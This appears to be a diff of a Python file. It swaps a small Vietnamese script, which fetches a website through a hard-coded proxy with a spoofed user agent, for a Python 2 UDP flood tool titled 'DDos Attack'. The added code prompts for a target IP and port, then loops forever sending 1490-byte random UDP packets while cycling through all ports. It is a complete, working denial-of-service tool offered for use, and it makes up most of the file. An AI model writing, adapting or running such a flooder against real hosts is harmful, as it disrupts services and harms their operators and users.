@@ -1,30 +1,50 @@
-import requests
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
 
-# URL mẫu để thử nghiệm (ví dụ là một URL có thể bị từ chối truy cập)
-url = 'https://4gchill.com'
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
 
-# Proxy và User Agent cụ thể
-proxy = '103.41.32.182:58080'
-user_agent = 'Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0'
+os.system("clear")
+os.system("figlet DDos Attack")
+print
+print "Author   : HA-MRX"
+print "You Tube : https://www.youtube.com/channel/UCCgy7i_A5yhAEdY86rPOinA"
+print "github   : https://github.com/Ha3MrX"
+print "Facebook : https://www.facebook.com/muhamad.jabar222"
+print
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
 
-# Hiển thị thông báo sử dụng proxy và user agent
-print(f"Đang sử dụng Proxy: {proxy}")
-print(f"Đang sử dụng User-Agent: {user_agent}")
-
-# Tạo session requests với proxy và user agent cụ thể
-session = requests.Session()
-session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
-session.headers = {'User-Agent': user_agent}
-
-try:
-    # Gửi yêu cầu HTTP GET với proxy và user agent đã chọn
-    response = session.get(url)
-    
-    # Kiểm tra mã trạng thái của response
-    if response.status_code == 200:
-        print("Response:")
-        print(response.text)
-    else:
-        print(f"Failed to retrieve data. Status code: {response.status_code}")
-except requests.RequestException as e:
-    print(f"Request error: {e}")
+os.system("clear")
+os.system("figlet Attack Starting")
+print "[                    ] 0% "
+time.sleep(5)
+print "[=====               ] 25%"
+time.sleep(5)
+print "[==========          ] 50%"
+time.sleep(5)
+print "[===============     ] 75%"
+time.sleep(5)
+print "[====================] 100%"
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
